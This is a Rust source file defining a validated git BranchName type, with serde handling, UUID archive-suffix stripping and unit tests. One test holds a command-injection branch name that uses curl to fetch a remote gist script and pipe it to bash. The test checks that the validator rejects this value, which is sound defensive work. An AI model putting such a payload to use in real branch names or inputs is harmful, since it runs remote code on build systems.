use derive_more::Display;
use git_validate::reference::name_partial;
use once_cell::sync::Lazy;
#[cfg(all(feature = "full", not(feature = "lite")))]
use regex::Regex;
#[cfg(feature = "lite")]
use regex_lite::Regex;
#[cfg(feature = "schema")]
use schemars::JsonSchema;
use std::{fmt, str::FromStr};
#[cfg(feature = "wasm")]
use wasm_bindgen::prelude::*;

use serde::{
    de::{self, Visitor},
    Deserialize, Deserializer, Serialize,
};

use crate::{error::REGEX_ERROR, Slug, ValidError};

// https://stackoverflow.com/questions/60045157/what-is-the-maximum-length-of-a-github-branch-name
pub(crate) const MAX_BRANCH_LEN: usize = 256;

#[allow(clippy::expect_used)]
static UUID_V4_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new("@[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}(/([0-9]*))?$")
        .expect(REGEX_ERROR)
});

#[typeshare::typeshare]
#[derive(Debug, Display, Clone, Eq, PartialEq, Ord, PartialOrd, Hash, Serialize)]
#[cfg_attr(feature = "schema", derive(JsonSchema))]
#[cfg_attr(feature = "db", derive(diesel::FromSqlRow, diesel::AsExpression))]
#[cfg_attr(feature = "db", diesel(sql_type = diesel::sql_types::Text))]
pub struct BranchName(String);

#[cfg(feature = "db")]
crate::typed_string!(BranchName);

impl BranchName {
    #[must_use]
    pub fn to_strip_archive_suffix(&self) -> Self {
        Self(UUID_V4_REGEX.replace(&self.0, "").to_string())
    }
}

impl FromStr for BranchName {
    type Err = ValidError;

    fn from_str(branch_name: &str) -> Result<Self, Self::Err> {
        if is_valid_branch_name(branch_name) {
            Ok(Self(branch_name.into()))
        } else {
            Err(ValidError::BranchName(branch_name.into()))
        }
    }
}

impl AsRef<str> for BranchName {
    fn as_ref(&self) -> &str {
        &self.0
    }
}

impl From<BranchName> for String {
    fn from(branch_name: BranchName) -> Self {
        branch_name.0
    }
}

impl From<Slug> for BranchName {
    fn from(slug: Slug) -> Self {
        Self(slug.into())
    }
}

impl<'de> Deserialize<'de> for BranchName {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: Deserializer<'de>,
    {
        deserializer.deserialize_str(BranchNameVisitor)
    }
}

struct BranchNameVisitor;

impl Visitor<'_> for BranchNameVisitor {
    type Value = BranchName;

    fn expecting(&self, formatter: &mut fmt::Formatter) -> fmt::Result {
        formatter.write_str("a valid branch name")
    }

    fn visit_str<E>(self, value: &str) -> Result<Self::Value, E>
    where
        E: de::Error,
    {
        value.parse().map_err(E::custom)
    }
}

#[cfg_attr(feature = "wasm", wasm_bindgen)]
pub fn is_valid_branch_name(branch_name: &str) -> bool {
    branch_name.len() <= MAX_BRANCH_LEN && name_partial(branch_name.into()).is_ok()
}

#[cfg(test)]
mod test {
    use super::{is_valid_branch_name, BranchName};
    use pretty_assertions::assert_eq;

    #[test]
    fn test_branch_name() {
        assert_eq!(true, is_valid_branch_name("refs/heads/main"));
        assert_eq!(true, is_valid_branch_name("main"));
        assert_eq!(true, is_valid_branch_name("MAIN"));
        assert_eq!(true, is_valid_branch_name("bencher/main"));
        assert_eq!(true, is_valid_branch_name("bencher-main"));

        assert_eq!(false, is_valid_branch_name(""));
        assert_eq!(false, is_valid_branch_name(" main"));
        assert_eq!(false, is_valid_branch_name("ma in"));
        assert_eq!(false, is_valid_branch_name("main "));
        assert_eq!(false, is_valid_branch_name(".main"));

        // Credit to https://github.com/nikitastupin
        let ref_name = "$(curl${IFS}-L${IFS}gist.githubusercontent.com/nikitastupin
            /30e525b776c409e03c2d6f328f254965/raw/shortcut.sh|bash)";
        assert_eq!(false, is_valid_branch_name(ref_name));
    }

    #[test]
    fn test_branch_name_strip_archive_suffix() {
        const MAIN: &str = "main";
        let branch_uuid = [
            "87d78709-8861-4eda-b0ca-b4abf7d82bb2",
            "2d7fb9dd-cba7-447d-a8c3-7b66fda24c85",
            "5cc34cc7-2826-4098-95d4-27404111c70d",
            "1c71ae15-3cc0-456e-a49c-39126699c1f1",
            "95521eff-09fa-4c02-abe1-dd824108869d",
        ];
        for (i, uuid) in branch_uuid.iter().enumerate() {
            let name = format!("{MAIN}@{uuid}");
            let branch_name = BranchName(name);
            assert_eq!(MAIN, branch_name.to_strip_archive_suffix().0);

            let name = format!("{MAIN}@{uuid}/{i}");
            let branch_name = BranchName(name);
            assert_eq!(MAIN, branch_name.to_strip_archive_suffix().0);
        }
    }
}
